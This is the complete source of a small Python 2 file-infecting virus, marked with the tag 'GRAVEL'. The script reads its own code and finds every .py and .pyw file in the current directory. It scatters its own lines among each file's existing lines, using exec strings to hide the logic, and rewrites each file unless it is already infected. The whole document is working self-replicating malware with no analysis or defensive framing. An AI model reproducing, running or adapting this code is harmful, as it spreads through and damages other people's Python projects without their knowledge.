VirusLines=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24]
import glob, sys
from string import *
MySelf=open(sys.argv[0])
MyCode=MySelf.readlines()
MySelf.close()
VirusCode=[]
exec("for i in range(0,len(VirusLines),1):\n\tVirusCode.append(MyCode[VirusLines[i]])")
VirusCode.append("#GRAVEL\n")
Hostfiles=glob.glob("*.py")+glob.glob("*.pyw")
slabolg=globals()
exec "for Hostfiles in Hostfiles:\n\tfor z in range(12,len(VirusCode),1):\n\t\texec VirusCode[z] in slabolg" in slabolg
source=open(Hostfiles,"rb")
code=source.readlines()
source.close()
exec "if len(code)>0:\n\tif (code[len(code)-1][-1])!=chr(10):\n\t\tcode[len(code)-1]+=chr(10)" in slabolg
GoodLines=[]
exec "for i in range(0,len(code),1):\n\tline=code[i]\n\tif (\"\t\" in line)!=True and (\":\" in line)!=True and (\"#\"in line)!=True and line[0]!=chr(10):\n\t\tGoodLines+=[i]" in slabolg
x=a=0
InfectedCode=[]
exec "for i in range(-1,len(code)-1,1):\n\tif ((i+1) in GoodLines)==1 and x<len(VirusLines)-1:\n\t\tInfectedCode.append(VirusCode[x])\n\t\tif x==0:\n\t\t\ta=i+x+1\n\t\tVirusLines[x]=i+x+1\n\t\tx+=1\n\t\tInfectedCode.append(code[i+1])\n\t\tInfectedCode.append(VirusCode[x])\n\t\tVirusLines[x]=i+x+2\n\t\tx+=1\n\telse:\n\t\tInfectedCode.append(code[i+1])" in slabolg
exec "if(x<len(VirusLines)):\n\tif len(code)==0:\n\t\ti=-2\n\tfor x in range(x,len(VirusLines),1):\n\t\tInfectedCode.append(VirusCode[x])\n\t\tif x==0:\n\t\t\ta=i+x+2\n\t\tVirusLines[x]=i+x+2" in slabolg
InfectedCode[a]="VirusLines="+str(VirusLines)+"\n"
exec "if find(str(code),\"GRAVEL\")==-1:\n\txls=open(Hostfiles,\"wb\")\n\tfor i in range(0,len(InfectedCode),1):\n\t\txls.write(InfectedCode[i])\n\txls.close()" in slabolg
#GRAVEL
